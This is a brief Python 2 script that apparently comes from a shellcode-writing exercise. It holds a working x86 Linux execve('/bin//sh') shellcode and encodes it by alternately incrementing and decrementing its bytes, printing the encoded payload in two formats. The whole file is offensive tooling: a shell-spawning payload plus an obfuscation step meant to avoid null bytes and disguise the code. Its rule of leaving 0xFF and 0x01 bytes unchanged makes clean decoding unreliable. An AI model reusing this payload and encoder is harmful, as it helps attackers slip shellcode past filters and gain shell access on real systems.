#!/usr/bin/python
# Python incdec Encoder
# The encoder ++ and -- alternating bytes in the shellcode.
# To avoid nulls;- when FF or 01 is encountered, they are ignored 

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

INC = True
for x in bytearray(shellcode) :
	# OR
	if(INC) :
		if (x==255) :
			y = x
		else :
			y = x + 1
		INC = False
	else :
		if (x==1) :
			y = x
		else :
			y = x - 1
		INC = True

	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' %y


print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
